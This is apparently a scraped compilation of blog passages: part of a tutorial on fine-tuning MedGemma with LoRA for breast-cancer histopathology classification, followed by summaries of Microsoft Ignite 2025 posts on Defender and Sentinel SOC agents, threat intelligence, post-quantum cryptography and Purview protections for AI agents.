widget. The widget saves the token temporarily in the instance's file system. code_block )])]> In our upcoming post, where we move this process to Cloud Run Jobs, we'll show you the correct and secure way to handle this token by using Secret Manager . Step 2: Load and prepare the dataset Next, we download the BreakHis dataset from Kaggle using the kagglehub library. This dataset includes a Folds.csv file, which outlines how the data is split for experiments. The original study used 5-fold cross-validation, but to keep the training time manageable for this demonstration, we'll focus on Fold 1 and we'll only use images with 100X magnification. You can explore using other folds and magnifications for more extensive experiments. code_block )])]> Step 2.1: Balance the dataset The initial train and test splits for the 100X magnification show an imbalance between benign and malignant classes. To address this, we'll undersample the majority class in both the training and testing sets in order to create balanced datasets with a 50/50 distribution. code_block )])]> Step 2.2: Create a Hugging Face dataset We're converting our data into the Hugging Face datasets format because it's the easiest way to work with the SFTTrainer from their Transformers library. This format is optimized for handling large datasets, especially images, because it can load them efficiently when needed. And it gives us handy tools for preprocessing, like applying our formatting function to all examples. code_block )])]> Step 3: Prompt engineering This step is where we tell the model what we want it to do. We create a clear, structured prompt that instructs the model to analyze an image and to return only the number that corresponds to a class. This prompt makes the output simple and easy to parse. We then map this format across our entire dataset. code_block )])]> Step 4: Load the model and processor Here, we load the MedGemma model and its associated processor. The processor is a handy tool that prepares both the images and text for the model. We'll also make two key parameter choices for efficiency: torch_dtype=torch.bfloat16 : As we mentioned earlier, this format ensures numerical stability. attn_implementation=\"sdpa\" : Scaled dot product attention is a highly optimized attention mechanism that's available in PyTorch 2.0. Think of this mechanism as telling the model to use a super-fast, built-in engine for its most important calculation. It speeds up training and inference, and it can even automatically use more advanced backends like FlashAttention if your hardware supports it. code_block )])]> Step 5: Evaluate the baseline model Before we invest time and compute in fine-tuning, let's see how the pre-trained model performs on its own. This step gives us a baseline to measure our improvement against. code_block )])]> The performance of the baseline model was evaluated on both 8-class and binary (benign/malignant) classification: 8-Class accuracy: 32.6% 8-Class F1 score (weighted): 0.241 Binary accuracy: 59.6% Binary F1 score (malignant): 0.639 This output shows that the model performs better than random chance (12.5%) , but there's significant room for improvement, especially in the fine-grained 8-class classification. A quick detour: Few-shot learning vs. fine-tuning Before we start training, it's worth asking: is fine-tuning the only way? Another popular technique is few-shot learning . Few-shot learning is like giving a smart student a few examples of a new math problem right before a test. You aren't re-teaching them algebra, you're just showing them the specific pattern you want them to follow by providing examples directly in the prompt. This is a powerful technique, especially when you're using a closed model through an API where you can't access the internal weights. So why did we choose fine-tuning? We can host the model: Because MedGemma is an open model, we have direct access to its architecture. This access lets us perform fine-tuning to create a new, permanently updated version of the model. We have a good dataset: Fine-tuning lets the model learn the deep, underlying patterns in our hundreds of training images far more effectively than just showing it a few examples in a prompt. In short, fine-tuning creates a true specialist model for our task, which is exactly what we want. Step 6: Configure and run fine-tuning with LoRA This is the main event! We'll use Low-Rank Adaptation (LoRA) , which is much faster and more memory-efficient than traditional fine-tuning. LoRA works by freezing the original model weights and training only a tiny set of new adapter weights. Here's a breakdown of our parameter choices: r=8 : The LoRA rank. A lower rank means fewer trainable parameters, which is faster but less expressive. A higher rank has more capacity, but risks overfitting on a small dataset. Rank 8 is a great starting point that balances performance and efficiency. lora_alpha=16 : A scaling factor for the LoRA weights. A common rule of thumb is to set it to twice the rank ( 2 \u00d7 r ). lora_dropout=0.1 : A regularization technique. It randomly deactivates some LoRA neurons during training to prevent the model from becoming overly specialized and failing to generalize. code_block )])]> The training took about 80 minutes on the A100 GPU with VRAM 40 GB. The results looked promising, with the validation loss steadily decreasing. Important (time saving!) tip: If your training gets interrupted for any reason (like a connection issue or exceeding resource limits), you can resume the training process from a saved checkpoint by using the resume_from_checkpoint argument in trainer.train() . Checkpoints can save you valuable time because they're saved at every save_steps interval as defined in TrainingArguments . Step 7: The final verdict - evaluating our fine-tuned model After training, it's time for the moment of truth. We'll load our new LoRA adapter weights, merge them with the base model, and then run the same evaluation that we ran for the baseline. code_block )])]> Final results So, how did the fine tuning impact performance? Let's look at the numbers for 8-class accuracy and macro F1. code_block )])]> The results are great! After fine-tuning, we see a dramatic improvement: 8-Class : Accuracy jumped from 32.6% to 87.2% (+54.6%) and F1 from 0.241 to 0.865. Binary : Accuracy increased from 59.6% to 99.0% (+39.4%) and F1 from 0.639 to 0.991. This project shows the incredible power of fine-tuning modern foundation models. We took a generalist AI that was already pre-trained on relevant medical data, gave it a small, specialized dataset, and taught it a new skill with remarkable efficiency. The journey from a generic model to a specialized classifier is more accessible than ever, opening up exciting possibilities for AI in medicine and beyond. All of the information is available in the Finetune Notebook . You can run it in with a GPU instance on Vertex AI Workbench . Want to take it to production? Don't forget to catch the upcoming post, which shows you how to bring the fine tuning and evaluation to Cloud Run jobs . I hope this guide was helpful. Happy coding!

Let\u2019s look at an example of how these agents might help in the day of the life of a SOC analyst. The day starts with Watchtower (BlueVoyant) confirming Sentinel connectors and Defender sensors are healthy, so investigations begin with full visibility. As alerts arrive, the Microsoft Defender Copilot Alert Triage Agent groups related signals, extracts key evidence, and proposes next steps; identity related cases are then validated with Login Investigator (adaQuest), which baselines recent sign-in behavior and device posture to cut false positives. To stay ahead of emerging campaigns, the analyst checks the Microsoft Threat Intelligence Briefing Agent for concise threat rundowns tied to relevant indicators, informing hunts and temporary hardening. When HR flags an offboarding, GuardianIQ (People Tech Group) correlates activity across Entra ID, email, and files to surface possible data exfiltration with evidence and risk scores. After containment, Automated Closing Comment Generator (Ascent Global Inc.) produces clear, consistent closure notes from Defender incident details, keeping documentation tight without hours of writing. Together, these Microsoft and partner agents maintain platform health, accelerate triage, sharpen identity decisions, add timely threat context, reduce insider risk blind spots, and standardize reporting\u2014 all inside the Defender portal.

      "title": "What\u2019s New at Ignite: Powerful Enhancements in Unified Threat Intelligence",
      "summary": "At Microsoft Ignite 2025, we\u2019re unveiling transformative upgrades in threat intelligence designed to empower security teams. With the Threat Intelligence Briefing Agent now fully integrated into the Defender portal, defenders can shift from reactive to proactive security strategies, using Microsoft\u2019s global intelligence combined with insights tailored to their organization. Additionally, the latest phase of the integration of Microsoft Defender Threat Intelligence (MDTI) with Defender XDR and Sentinel brings together unified, real-time threat intelligence and advanced analytics, streamlining the SecOps experience and equipping organizations with powerful tools to anticipate and address emerging threats more effectively. Threat Intelligence Briefing Agent in Defender Launched in March , the Threat Intelligence Briefing Agent has already enabled security teams to shift from reactive defense to proactive threat anticipation. At Ignite, we\u2019re excited to announce that this agent is now fully integrated into the Microsoft Defender portal, currently available in Public Preview. It delivers daily, customized briefings, combining Microsoft\u2019s global threat intelligence with insights specific to each organization, in just minutes. Instead of spending hours piecing together information from multiple sources, analysts now receive automated, up-to-date intelligence summaries. These briefings help analysts quickly prioritize actions by providing risk assessments, clear recommendations, and direct links to vulnerable assets, empowering organizations to address exposures proactively. MDTI Convergence into the Defender Portal In July, we announced the integration of Microsoft Defender Threat Intelligence (MDTI) directly into Defender XDR and Microsoft Sentinel . This integration delivers world-class, real-time threat intelligence within a unified SecOps experience, all at no additional cost. We are pleased to share that the first phase of this convergence is now available in Public Preview. It features Microsoft\u2019s comprehensive threat intelligence library within Threat Analytics, and new enhancements making it easier than ever for users to access, understand, and act on this critical information. Threat Intelligence Library in the Defender Portal Defender XDR customers will have access to Microsoft\u2019s comprehensive threat intelligence library via threat reports within threat analytics (TA) . This includes exclusive analyses of threat activity and the detailed content focused on threat actors, threat tooling, and vulnerabilities found in i ntel profiles . Threat reports are automatically correlated with related incidents and affected assets, revealing endpoint vulnerabilities and recommended actions. Threat analytics in Defender enables and empowers customers to get threat insights around emerging threats on a global scale . Threat analytics provides contextual and operational information about the relevance of each threat for an organization, which allows security teams to organize and prioritize their operations and triage processes based on impact, available as in-product reports. Threat reports published in Threat analytics include threat activity such as: Active threat actors and their campaigns Popular and new attack techniques Critical vulnerabilities Common attack surfaces Prevalent malware Threat reports provide analysts with insights into the methods and attack patterns employed by threat actors, along with details on vulnerabilities, zero-day exploits, and potentially harmful tools. These findings are correlated with relevant contextual information from the customer's environment to assess the specific impact each threat may have on their organization. Threat Analytics library now also available to Sentinel-only customers Sentinel-only customers now have access to Microsoft\u2019s threat intelligence library through reports in Threat Analytics (TA) , currently in Public Preview. This upgrade, now in Public Preview, brings Microsoft\u2019s world-class threat intelligence and actionable indicators to Sentinel without a Defender XDR license. While incident correlation and automated response remain exclusive to Defender XDR, standalone Sentinel deployments gain improved threat visibility and integrated security options. What\u2019s new in Threat Analytics Threat reports within Threat Analytics have been upgraded with enhanced insights\u2014previously accessible exclusively through an MDTI license\u2014to provide Defender customers with improved context regarding finished intelligence on prevalent threats. The following contextual insights for each report are now available within Threat Analytics: Indicators of Compromise : Each threat report now includes a comprehensive list of indicators attributed to the specific threat. This feature allows customers to review all relevant indicators and access detailed entity information within Defender directly from the report, streamlining navigation to support efficient investigation and triage. MITRE ATT&CK Mapping : By mapping threats\u2019 tactics, techniques, and procedures (TTPs) to the MITRE ATT&CK framework, customers can proactively identify, detect, and mitigate persistent techniques, ultimately enhancing overall security posture. Targeted Industries & Actor Origin : Reports provide insight into targeted industries and threat actor origins, enabling analysts to prioritize intelligence and contextualize motivations and observed TTPs. Related Intelligence & Aliases : Threat Analytics offers links to related intelligence and presents actor or tool aliases, allowing customers to cross-reference reports and understand the alignment between Microsoft Threat Intelligence and broader industry developments.

The reports are systematically organized and can be filtered by Actor, Tool, Technique, Vulnerability, Activity, or Core threat, making it quicker to locate specific reports. Read more about threat analytics report and the information available here . Access to Indicators of Compromise Indicators of Compromise linked to specific threats provide SOC Analysts with valuable insight into the most common risks faced by their organization. For Defender customers, threat analytics now makes it easier to filter this data according to particular threats. Because information about indicators is vital, unauthorized access poses a risk of data theft or exploitation by malicious actors. Recognising its sensitivity, access to Indicators is restricted to verified customers only. Customers who do not have access to indicators will see the following when attempting to access it: In scenarios where access is restricted, customers will have the option to verify themselves by submitting business information to get access on successful verification. Read more about access to indicators . Customers with access to indicators (with or without the need to submit additional verification) will be able to see the entire list. The improvements to Threat analytics described above are designed to deliver a unified threat intelligence experience. By integrating MDTI features into Microsoft Defender and Sentinel, customers will progressively have access to more valuable insights that were previously available only with paid MDTI licenses. Read more about MDTI convergence here . Link Cases to IOCs for Complete Threat Context You can now link a case directly to relevant Indicators of Compromise (IOCs), ensuring investigations and response workflows stay connected. This feature improves visibility and collaboration, enabling faster, more informed decisions during threat investigations. Conclusion The integration of the Threat Intelligence Briefing agent into the Defender Portal and the convergence of MDTI into Microsoft Defender and Sentinel represents a major leap forward for security teams, delivering unified threat intelligence and streamlined workflows. With enhanced access to threat reports, indicators of compromise, and contextual insights, organizations are better equipped to proactively defend against emerging threats and respond with greater speed and confidence.

      "title": "Microsoft Ignite 2025: Power the next era of cybersecurity with Microsoft Sentinel",
      "summary": "At Microsoft Ignite 2025 , we\u2019re showcasing how Microsoft Sentinel \u2014trusted by over 40,000 customers worldwide\u2014 combines industry-leading SIEM capabilities with a purpose-built security data lake to transform security operations. This powerful combination delivers deep visibility, advanced analytics, and cost-efficiency\u2014empowering security teams to detect, investigate, and respond faster in an AI-driven era. IT environments and threats have exploded in size and complexity in recent years. Microsoft Sentinel\u2019s AI-powered platform with data lake, graph, and AI tools gives security teams the capabilities they need to keep up. The Sentinel data lake is a game-changer. It enabled Simbian's AI SOC and Threat Hunt Agents to efficiently analyze months of correlated security data across the enterprise. Ambuj Kumar | Co-founder and CEO | Simbian Join us November 18\u201321 at the Moscone Center in San Francisco or online to explore latest innovations in Sentinel SIEM and data lake, and dive into immersive sessions designed to strengthen defenses and accelerate impact. Proactive Response: Automatic attack disruption on AWS, Proofpoint & Okta Automatic attack disruption is now extending beyond XDR, incorporating data from AWS, Proofpoint and Okta when brought in through Sentinel. By leveraging millions of signals from Microsoft Threat Intelligence, this feature uses AI to detect sophisticated threats like phishing, business email compromise, and identity compromise across federated accounts and cloud boundaries. Once an attack is identified, compromised assets are contained in near real time, reducing dwell time and minimizing business impact. Integrating telemetry from AWS, Proofpoint, and Okta, security teams can transition from reactive detection to proactive, cross-platform protection, ensuring cohesive defense and lowering operational complexity. AI-Assisted SOC: introducing agentic tools in Defender We are excited announce Security Copilot-powered agents that can transform how SOC teams detect, investigate, and respond to threats by bringing AI into day-to-day workflows for SIEM and XDR users within Defender. The Threat Hunting Agent transforms threat hunting by allowing analysts to conduct end-to-end investigations using natural language. It provides direct answers, guides users through investigative steps, and surfaces actionable insights. This agent-driven experience helps analysts of all skill levels hunt faster, more accurately, and with rich security context. The Threat Intelligence Briefing Agent is now seamlessly integrated into the Microsoft Defender portal. In just a few minutes, the agent generates tailored threat briefings that synthesize the latest insights from Microsoft Threat Intelligence and hundreds of global sources, directly contextualized to an organization\u2019s unique environment. Analysts can use these briefings to understand evolving risks and emerging campaigns, critical CVEs, and at-risk assets to understand what to focus on first. They can then use the agent\u2019s clear recommendations and deep linking to affected assets to proactively address exposures. With real-time, dynamic intelligence and an intuitive review path, the Threat Intelligence Briefing agent transforms complex threat data into actionable guidance, empowering organizations to make faster, smarter security decisions every day. The Dynamic Threat Detection Agent proactively hunts for false negatives and blind spots that traditional alerting might miss. When a critical incident happens, Copilot automatically hunts to uncover undetected threats\u2014like unusual residual activity around a sensitive identity. This agent turns \u2018probably fine\u2019 into proven secure\u2014finding and fixing false negatives to keep organizations safer. Accelerated Onboarding: AI powered SIEM migration tool We\u2019re excited to announce the new enhanced SIEM migration experience for Microsoft Sentinel\u2014designed to simplify and accelerate migrations from Splunk and QRadar. SIEM migrations are complex and resource-intensive, often taking months. While many solutions simply convert queries into proprietary syntax, Microsoft takes a different approach\u2014driving true SOC transformation with advanced correlation and insights that go beyond syntax conversion. This ensures a fully integrated, future-ready SOC aligned with modern security needs\u2014not just translated legacy queries. Support for Splunk will be available in public preview by early December 2025, and QRadar support will follow soon . This tool will enable customers to upload exports from their existing SIEM and receive tailored recommendations for Microsoft Sentinel setup. The tool analyzes uploaded data to identify techniques, data sources, and detection rules, then maps them to production-ready, out-of-the-box Sentinel detections. It also highlights missing connectors and recommends enabling them to ensure full coverage. With one-click activation of recommended rules and connectors, customers can quickly operationalize their security posture without manual configuration. This approach moves beyond simple syntax translation, delivering accurate, intent-based mapping for better detection coverage and ongoing optimization\u2014so your security stays effective and up to date without extra effort. To help customers accelerate their Sentinel journey, Microsoft offers migration support at no additional cost to customers through the Cloud Accelerate Factory program.

      "summary": "Introduction We are excited to announce a significant leap forward in security: Post-Quantum Cryptography (PQC) algorithms are now generally available in Windows Server 2025 and Windows 11 clients (24H2, 25H2) and .NET 10. This major milestone is part of Microsoft's ongoing commitment to help organizations stay ahead of evolving cybersecurity threats and prepare for the era of quantum computing. This announcement aligns with the broader strategy of Microsoft\u2019s Quantum Safe Program (QSP), as highlighted in this blog post, which outlines the company\u2019s comprehensive roadmap for PQ readiness. The general availability of PQC algorithms in Windows Server 2025, Windows 11, and .NET 10 represents a significant initial step within the \u2018Foundational security components\u2019 phase of this initiative, with further milestones and enhancements planned to bolster security in the years ahead. PQC Algorithms Now GA in Windows Server 2025 and Windows 11 Client In May this year, we brought PQ C to Windows Insiders . With the November update of Windows, we\u2019re bringing ML-KEM and ML-DSA to Windows Server 2025 and Windows 11 client via updates to Cryptography API: Next Generation (CNG) libraries and Certificate functions . Developers now have access to ML-KEM for use in scenarios requiring key encapsulation or key exchange, enhancing preparedness against the \"harvest now, decrypt later\" threat. Additionally, developers can adopt ML-DSA for scenarios involving identity verification, integrity checks, or digital signature-based authentication. These updates represent a step towards enabling systems to safeguard sensitive data from both current and anticipated cryptographic challenges. Enhanced Security: PQC algorithms provide resilience against potential quantum-based attacks, which are expected to render many traditional cryptographic schemes obsolete. Seamless Integration: The PQC enhancements are integrated directly into the Windows cryptographic infrastructure, allowing for easy deployment and management. Enterprise-Ready: These features have been extensively tested to meet the performance and reliability needs of enterprise environments. Visit our crypto developer\u2019s pages for ML-KEM and ML-DSA to learn more and get started. General Availability of PQC in .NET 10 In addition to Windows platform enhancements, we are thrilled to announce the general availability of PQC support in .NET 10. Developers can now build and deploy applications that utilize PQC algorithms, enabling robust data protection in the quantum era. Developer Empowerment: .NET 10 integrates PQC options within its cryptographic APIs, making it simple for developers to modernize their security posture. Cross-Platform Support: Build secure applications for Windows or Linux using the same PQC-enabled framework. Future-Proofing: Adopt the latest cryptographic standards with minimal code changes and broad compatibility. Learn more about these changes he r e , and check out .NET 10 to get started. Coming Soon : PQC in Active Directory Certificate Services (ADCS) Looking ahead, we are pleased to share that the general availability of PQC capabilities in Active Directory Certificate Services (ADCS) is targeted for early 2026. This forthcoming update will further strengthen the foundation of your organization\u2019s identity and certificate management infrastructure.

Easy Migration: Detailed guidance and configuration examples will be provided to help organizations transition their PKI environments to PQC. Long-Term Security: Protect identities, devices, and communications well into the quantum era with minimal disruption. What Lies Ahead: Upcoming D evelopments and Challenges As cryptographic standards advance, SymCrypt will continue to incorporate additional quantum-resistant algorithms to maintain its leadership in security innovation. The development of PQC support for securing TLS is proceeding in alignment with IETF standards, aiming to provide strong protection for data in transit. In addition, Microsoft is preparing other essential domains\u2014including firmware and software signing, identity, authentication, network security, and data protection\u2014to be PQC-ready. Collaborating with ecosystem partners, these initiatives further extend the reach of quantum-safe security throughout the broader ecosystem. As PQC algorithms are still relatively new, it is important for organizations to consider \" crypto agility ,\" allowing systems to adapt as standards evolve. Microsoft advises customers to begin planning their transition to PQC by integrating new algorithms and adopting solutions that support both current and future cryptographic needs. In some cases, this means deploying PQC in hybrid or composite modes\u2014combining a post-quantum algorithm with a traditional one such as RSA or ECDHE. Other situations may call for enabling pure PQC algorithms while maintaining compatibility with existing standards. Over time, as quantum technologies mature, we may see a shift towards only PQC. PQC algorithms may require increased computational resources, making ongoing optimization and hardware acceleration necessary to achieve an effective balance between security and performance. The transition to PQC includes updating cryptographic infrastructure, maintaining compatibility with legacy systems, and facilitating coordination among developers, hardware manufacturers, and service providers. Education and awareness are also important for broad adoption and compliance. Next Steps and Resources We encourage IT administrators, developers, and security professionals to begin leveraging PQC features in Windows Server 2025, Windows 11, and .NET 10, and to prepare for the upcoming enhancements in ADCS. Detailed documentation and best practices are available here: Using ML-KEM with CNG for Key Exchange Using ML-DSA with CNG for Digital Signatures What's new in .NET libraries for .NET 10 Conclusion Microsoft is committed to helping customers secure their environments against the threats of today and tomorrow.

      "title": "Announcing New Microsoft Purview Capabilities to Protect GenAI Agents",
      "summary": "As organizations accelerate their adoption of agentic AI, a new and urgent challenge is emerging: how to protect the rapidly growing number of agents\u2014first-party, third-party, and custom-built\u2014created and deployed across the enterprise. At Microsoft Ignite, we\u2019re introducing major advancements in Microsoft Purview to support our customers in securing all their agents, wherever they operate. The New Reality: Agents Everywhere, Data Risks Amplified For many organizations, the pace of agent creation is outstripping traditional oversight. Developers, business units, and other information workers can spin up agents to automate tasks, analyze data, or interact with enterprise systems. This proliferation brings tremendous opportunity, but also a new level of risk. New agents can access sensitive information, trigger cascading actions of other agents, and operate outside direct human supervision. The anxiety is real: how do you protect every agent, even those you didn\u2019t know existed? Data risks are especially critical in this new landscape. Agents can process and share sensitive information at scale, interact with external systems, and invoke other agents or large language models, multiplying the complexity and potential of data exposure. Unlike traditional apps, agents are dynamic, autonomous, and currently often invisible to standard security controls. The risk surface expands with every new agent, making comprehensive data protection not just a technical requirement, but a business imperative. Purview for Agent 365: Protections for a more complex agent world Therefore, this week, we are announcing Agent 365 (A365) as the control plane for agents, enabling organizations to confidently manage, secure, and govern AI agents\u2014first-party, third-party, and custom-built\u2014across the enterprise. With A365, teams can extend familiar Microsoft 365 tools and policies to agents, ensuring unified inventory, robust access controls, lifecycle management, and deep integration with productivity apps. That\u2019s why we\u2019re extending Microsoft Purview protections to A365, bringing enterprise-grade security, compliance, and risk management to every agent. Here\u2019s what we\u2019re introducing to make this possible: AI Observability in Data Security Posture Management: Organizations gain visibility, risk assessment, and guided remediation for agents across Microsoft environments. Note: While third-party agents are included in the inventory, assigned risk levels, risk patterns, and guided remediation currently apply to M365 Copilot agents, Copilot Studio, and Microsoft Foundry agents. Figure 1: AI Observability in Data Security Posture Management Agentic Risk in Insider Risk Management: New agent-specific risk indicators and behavioral analytics enable precise detection and policy enforcement. For example, organizations can now identify risky agent behaviors, such as unauthorized data access or unusual activity patterns, and take targeted action to mitigate threats. Data Loss Prevention (DLP) and Information Protection controls extended to agent actions: Purview DLP and Information Protection policies now extend to agents that operate autonomously, allowing these agents to inherit the same protections and organizational policies as users. For example, these built-in controls ensure AI agents don\u2019t access or share sensitive data when accessing M365 data within apps, whether that means blocking access for agents to labeled files or preventing agents from sending external emails and Teams messages that contain sensitive data. Expanded governance via Communication Compliance, Audit, Data Lifecycle Management and eDiscovery: Organizations benefit from expanded proactive detection, secure retention, and policy-based governance for interactions between humans and agents. Figure 2: eDiscovery supports search, review and export of agent interactions for simplified discovery cases. By including these protections in A365, organizations can apply Purview\u2019s enterprise-grade security, compliance, and risk controls to every agent\u2014making it simpler and safer for customers to deploy agents at scale. Learn more about the A gent 365 announcement . Extending Purview Controls for All Agents Not all agents in an organization will run under an A365 license, yet every agent still requires strong data security and compliance controls. For that reason, we are also adding the following Purview capabilities: Inline data protection for prompts and responses: Expanded DLP capabilities prevent the sharing of sensitive data or files between users and third-party agents (such as ChatGPT or Google Gemini in Agent mode) through inline data protection for the browser and network . Purview SDK embedded in Agent Framework SDK: Purview SDK embedded in Agent Framework SDK enables developers to seamlessly integrate enterprise-grade security, compliance, and governance into the AI agents they build. This integration enables automatic classification and protection of sensitive data, prevents data leaks and oversharing, and provides visibility and control for regulatory compliance\u2014empowering organizations to confidently and securely adopt AI agents in complex environments. Embedding Security into the Foundry Development Pipeline We are also adding several Purview capabilities specifically available in Foundry: Purview integration with Foundry: Purview is now enabled within Foundry , allowing Foundry admins to activate Microsoft Purview on their subscription. Once enabled, interaction data from all apps and agents flows into Purview for centralized compliance, governance, and posture management of AI data. Azure AI Search honors Purview labels and policies: Azure AI Search now ingests Microsoft Purview sensitivity labels and enforces corresponding protection policies through built-in indexers (SharePoint, OneLake , Azure Blob, ADLS Gen2). This enables secure, policy-aligned search over enterprise data, enabling agentic RAG scenarios where only authorized documents are returned or sent to LLMs, preventing data oversharing and aligning with enterprise data protection standards. Communication Compliance for Foundry: N ew policies e xtend Communication Compliance capabilities to Foundry, allowing security admins to set organization-wide Communication Compliance policies for acceptable communication for interactions with Foundry-built apps and agents, supported by Microsoft\u2019s Responsible AI Standa rd. In F oundry Control Plane, Foundry admins will be able to view any deviations from this policy. In addition, Purview admins will be able to review potentially risky AI interactions in Communication Compliance, enabling them to decide on appropriate next steps. Figure 3: Communication Compliance provides vi si bility to potenti al unethical or harmful agent interactions Automated AI Compliance Assessments : The new integration between Microsoft Purview Compliance Manager and Foundry delivers automated, real-time compliance for AI solutions. Organizations can quickly assess agents against global standards like the EU AI Act, NIST AI RMF, and ISO/IEC, with one-click assessments and live monitoring of critical controls such as fairness, safety, and transparency. This streamlined approach eliminates manual mapping, surfaces actionable insights, and helps AI systems remain audit-ready as they evolve. Strengthening Trust in Microsoft 365 Copilot And we\u2019re not stopping there. We\u2019re continuing to expand Purview\u2019s protections for Microsoft 365 Copilot to help organizations provide real-time protection for sensitive data in and accelerate remediation of oversharing risks. New enhancements include: Item-level oversharing investigation and remediation: Data security admins can now use data risk assessments in DSPM to analyze user sharing links in SharePoint and OneDrive and take bulk actions such as applying sensitivity labels to shared files, requesting the site owner to review sharing links, or disabling the links entirely. These enhancements streamline risk management, reduce exposure, and give organizations greater control over sensitive data at scale. E xpanding DLP for Microsoft 365 Copilot to safeguard sensitive prompts and prevent data leakage : This new real-time control applicable to M365 Copilot, Copilot Chat and Copilot agents, helps prevent data leaks and oversharing by detecting and blocking sensitive data based on SITs in prompts. By blocking the prompt, this also prevents sensitive data from being used for grounding in Microsoft 365 or the web. This expands on the existing capability to prevent sensitive files & emails from being accessed by Copilot based on sensitivity label. Data security and compliance admins need stronger controls for Copilot-related assets like Teams meeting recordings and transcripts. They want to identify recordings with sensitive data and delete them to reduce risk and free up storage. We are announcing two new capabilities to help: Priority cleanup for M365 Copilot assets: Enables admins to override existing retention policies and compliantly delete files, such as meetings recordings and transcripts created to support Copilot use. Priority cleanup is now generally available in Purview Data Lifecycle Management. On-demand classification now extends to meeting transcripts: Information Protection automatically classifies files when they\u2019re created, accessed, or modified, identifying sensitive information in real time. On-demand classification brings the same discovery and classification to data-at-rest without requiring user interactions. We\u2019ve now added meeting transcripts to that coverage. Once the sensitive data in meeting transcripts is discovered and classified, admins can apply DLP or Data Lifecycle Management (DLM) to protect sensitive data from being shared or exposed unintentionally. Honoring Purview data security controls when using Copilot Mode in Edge for Business: Microsoft Edge for Business now features Copilot Mode to empower users to accelerate their productivity through AI-assisted browsing. Copilot Mode honors existing Purview data protections, such as preventing summarization of sensitive content open in the browser. Additionally, Agent Mode can be enabled for multi-step agent workflows in the browser. These agentic workflows will honor the user\u2019s existing DLP protections, such as endpoint DLP policies that prevent pasting of sensitive data to sensitive service domains. Collectively, these capabilities reinforce Purview as the enterprise standard for securing AI-powered productivity. They give organizations the protections they need to scale Copilot usage with confidence and control. Empowering Secure Agentic AI Adoption As agents become integral to enterprise operations, Purview\u2019s expanded protections empower organizations to safely embrace agentic AI\u2014maintaining control, trust, and accountability at every step. With unified data security and compliance, organizations can observe and assess agent risk, prevent oversharing and leakage, detect risky agent behavior, and take decisive control to turn agentic AI into a trusted engine for growth.

      "title": "Ignite 2025: What's new in Microsoft Defender?",
      "summary": "This Ignite we are focused on giving security teams the edge they need to meet adversaries head on in the era of AI. The modern Security Operations Center (SOC) is undergoing a fundamental transformation, placing AI at the forefront of innovation - not just as an added feature, but as a driving force at every layer of the stack. While much attention is rightly focused on the development of security agents, we fundamentally believe that AI must also evolve the very foundation of our security solutions. This means building solutions that more effectively uncover novel threats, act dynamically to defend the organization during attacks, and reduce the workload for the security team. As organizations adopt AI at an unprecedented speed, we also want to make sure they can do so securely. To meet these security needs of the AI era, we are excited to announce a series of innovations that will help organizations shift to an autonomous defense and an agentic SOC. New agents to help scale and accelerate security operations Evolving Microsoft Defender\u2019s autonomous defense capabilities for better protection Secure your low-code and pro-code AI agents with Microsoft Defender Today, we are taking the first step in shifting security operations from static controls to autonomous defense and from manual toil to agentic operations. But we have an ambitious vision to augment and evolve these AI capabilities and agents across the entire SOC lifecycle and are excited to share some of that vision, as shown in the below graphic, with you at Microsoft Ignite . The Agentic SOC: Scaling expertise and accelerating defense We are excited to introduce four new Security Copilot agents in Microsoft Defender that bring autonomous intelligence across different stages of the SOC lifecycle. These agents combine context, reasoning, and complex workflows to help defenders anticipate attacks sooner, detect smarter, and investigate faster than ever before. Phishing Triage Agent: In March 2025, we introduced the Phishing Triage Agent, built to autonomously handle user-submitted phishing reports at scale. The agent reviews and classifies incoming alerts, resolves false positives and escalates only the malicious cases that require human expertise. Early data shows that analysts working with the agent caught up to 6.5x more malicious emails compared to professional graders. Today, we\u2019re excited to announce that the agent\u2019s triage capabilities will soon extend beyond phishing to cover identity and cloud alerts . Secondly, we are also improving our phish admin reporting process with a new agentic email grading system . It replaces a manual review process with advanced large language models and agentic workflows to deliver rapid, transparent verdicts and clear explanations to customers for every reported email. Learn more about the agentic email grading system. Threat Hunting Agent \u2013 this agent reimagines the investigation process. Instead of requiring analysts to master complex query languages or sift through mountains of data, the Threat Hunting Agent enables natural language investigations with contextual insight. Analysts can vibe with the agent by asking questions in plain English, receive direct answers, and be guided through comprehensive hunting sessions. This levels up the current NL2KQL experience by enabling analysts to explore patterns, pivot intuitively and uncover hidden signals in real time for a fluid, context-aware experience. This not only accelerates investigations but makes advanced threat hunting accessible to every member of the SOC, regardless of experience level. Dynamic Threat Detection Agent \u2013 One of the hardest challenges in detection engineering is finding and fixing false negatives. The Dynamic Threat Detection Agent proactively hunts for false negatives and blind spots that traditional alerting might miss. When a critical incident happens, Copilot will kick off an automated hunt to uncover undetected threats\u2014like unusual residual activity around a sensitive identity. This agent turns \u2018probably fine\u2019 into proven secure\u2014hunting the quiet persistence that slips past alerts and closing the gap before it becomes tomorrow\u2019s breach. Threat Intelligence (TI) Briefing Agent \u2013 Now native in the Defender portal. Generate tailored, AI\u2011authored threat briefings in minutes\u2014synthesizing global intel with your environment\u2019s context\u2014without leaving the incident pane. Figure 1. The Threat Hunting Agent showing insights on an incident that contained a high risk binary To make the agents easily accessible and help security teams get started more quickly, we are excited to announce that Security Copilot will be available to all Microsoft 365 E5 customers . Rollout starts today for existing Security Copilot customers with Microsoft 365 E5 and will continue in the upcoming months for all Microsoft 365 E5 customers. Customers will receive 30-day advanced notification before activation . Learn more. Autonomous Defense at Platform Scale Threat actors are automating everything. Ransomware campaigns can encrypt an entire environment in under an hour. Adversaries evade detection and pivot across identities, endpoints, and cloud resources faster than human teams can triage alerts. Traditional SOC models\u2014built on manual workflows and fragmented tools\u2014simply can\u2019t keep pace. Every second of delay gives attackers an advantage. Microsoft Defender now counters that speed by delivering autonomous defense at scale. Defender shifts security from reactive firefighting to proactive protection, embedding AI into the foundation of our protection solutions for instant detection, disruption, and containment\u2014before threats escalate. In 2023, we introduced automatic attack disruption , which autonomously stops attacks in progress\u2014like ransomware or business email compromise\u2014with policy-bound actions that isolate endpoints, disable compromised accounts, and block malicious IPs at machine speed. Today, we\u2019re taking the next step. New capabilities show how AI and agentic technology are transforming security to better protect customers: Unleash automatic attack disruption across your SIEM data : We are expanding the disruption capabilities of Microsoft Defender to some of the most critical data sources customer connect via Microsoft Sentinel including AWS, Proofpoint and Okta. This enables real-time detection and automatic containment of threats like phishing and identity compromise on top of your log data, fundamentally turning your SIEM into a threat protection solution. While these capabilities leverage the power of our platform, Defender is not a requirement for customers to realize this value in Microsoft Sentinel. Figure 2. Attack disruption initiated on an AWS attack Predictive shielding \u2013 This brand-new automatic attack disruption capability activates immediately after an attack is first contained. Our first of 